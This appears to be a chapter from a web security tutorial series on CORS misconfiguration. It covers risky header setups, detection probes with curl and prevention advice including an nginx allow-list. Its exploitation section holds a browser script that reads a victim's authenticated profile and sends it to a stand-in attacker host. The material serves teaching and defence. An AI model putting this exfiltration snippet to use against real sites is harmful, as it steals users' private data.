# CORS Misconfiguration

CORS controls cross-origin HTTP requests. Misconfiguration allows attackers to read sensitive data from other origins.

## Dangerous Configurations

### Reflective Origin
```http
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```
When the server echoes back any Origin header with credentials allowed.

### Wildcard Origin
```http
Access-Control-Allow-Origin: *
```
Less dangerous without credentials, but exposes non-authenticated data.

### Null Origin
```http
Access-Control-Allow-Origin: null
```
Exploitable via data: URI, sandboxed iframes, file: protocol.

## Exploitation
```html
<script>
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.text())
  .then(data => new Image().src = 'https://attacker.com/steal?' + data);
</script>
```

## Detection
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/sensitive
curl -H "Origin: null" -I https://target.com/api/sensitive
curl -H "Origin: https://target.com.evil.com" -I https://target.com/api/sensitive
```

## Prevention
1. Don't use wildcards with credentials
2. Validate Origin against an allow-list
3. Never echo the Origin header blindly
4. Use Vary: Origin for caching per origin

```nginx
location /api/ {
    if ($http_origin ~* (https?://trusted\.com(:\d+)?$)) {
        add_header Access-Control-Allow-Origin "$http_origin";
        add_header Access-Control-Allow-Credentials "true";
    }
}
```

---

> **Next**: [Subdomain Takeover](15-subdomain-takeover.md)
